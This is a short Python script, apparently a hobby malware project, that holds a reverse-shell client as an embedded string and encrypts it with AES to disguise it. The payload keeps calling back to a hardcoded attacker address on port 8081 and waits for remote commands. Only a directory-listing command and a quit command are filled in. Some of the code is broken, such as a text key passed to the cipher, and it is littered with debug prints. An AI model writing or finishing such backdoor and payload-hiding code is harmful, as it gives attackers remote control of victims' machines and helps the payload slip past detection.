from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

data = b"""
def reliable_recv():
    print("Reliably reieved")
    data = ""
    while True:
        try:
            print(data)
            data = data + connection_to_attacker.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    print("Reliably Recved")
    json_data = json.dumps(data)
    connection_to_attacker.send(json_data.encode())

def shell():
    print("Inside the shell functions")
    while True:
        command = reliable_recv()
        print("Command Recieved")
        if command == 'terminate':
           connection_to_attacker.close()
           break
        elif command == 'pwd':
            try:
                print("HEEEEEEEEEEEE")
                files = os.getcwd()
                files = str(files)
                print(files)
                reliable_send(files)
            except:
                pass
        elif command == 'clear':
            pass
        else:
            print("FuckOff")
                

def connection():
    while True:
        print("connection sending")
        #random.randint(5,15)
        time.sleep(5)
        try:
            print("Trying to send connection to the attacker")
            connection_to_attacker.connect(("192.168.39.129", 8081))
            print("call To the shell function")
            shell()
            connection_to_attacker.close()
            break
        except:
            connection()

connection_to_attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()

"""



key = input('''Enter the key for encryption(must be 16, 24 or 32 bytes long):''')
cipher = AES.new(key, AES.MODE_EAX)
ciphertext, tag = cipher.encrypt_and_digest(data)


file_out1 = open("key.bin", "wb")
[ file_out1.write(key) ]
file_out1.close()



file_out = open("encryptedfile.bin", "wb")
[ file_out.write(x) for x in (cipher.nonce, tag, ciphertext) ]
file_out.close()
